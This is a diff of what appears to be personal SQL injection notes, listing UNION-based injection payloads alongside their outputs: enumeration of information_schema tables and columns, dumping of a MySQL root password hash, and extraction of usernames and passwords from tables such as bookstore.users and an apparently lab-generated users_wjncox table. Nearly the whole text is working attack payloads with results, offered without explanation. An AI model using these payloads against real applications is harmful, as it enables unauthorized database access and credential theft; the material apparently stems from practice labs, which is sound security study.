@@ -14,10 +14,34 @@ UNION select 1,concat(user,0x3a,authentication_string),3,4,5,6,7,8 FROM mysql.us
 >>root:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
 
 
+-----------------------------------------------------------------------------------------
 
 
+' UNION select 1,concat(table_schema,0x3a,table_name,0x3a,column_name),3,4,5,6,7,8,9 FROM information_schema.columns
+>>bookstore:users:Username
+>>bookstore:users:Password
 
-UNION select 1,concat(table_schema,0x3a,table_name,0x3a,column_name),3,4,5,6,7,8,9 FROM information_schema.columns
+' UNION select 1,group_concat(username,0x3a,password),3,4,5,6,7,8,9 FROM bookstore.users;#
+>>admin:XXXXXXX
+
+------------------------------------------------------------------------------------------
 
 
-UNION select 1,group_concat(username,0x3a,password),3,4,5,6,7,8,9 FROM ssh.ssh_users;#
+' union select concat(table_schema,':',table_name),null FROM information_schema.columns--
+>>public:users_wjncox
+
+'+UNION SELECT table_name, NULL FROM information_schema.tables--
+>>users_wjncox
+
+ ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_wjncox'--
+>>username_vjfqaz
+>>password_fcbidc
+
+
+' UNION SELECT username_vjfqaz, password_fcbidc FROM users_wjncox--
+>>wiener
+>>zx7z65kw9f0bguzipipj
+>>administrator
+>>lzol7cqsdf6qcby6jeur
+
+
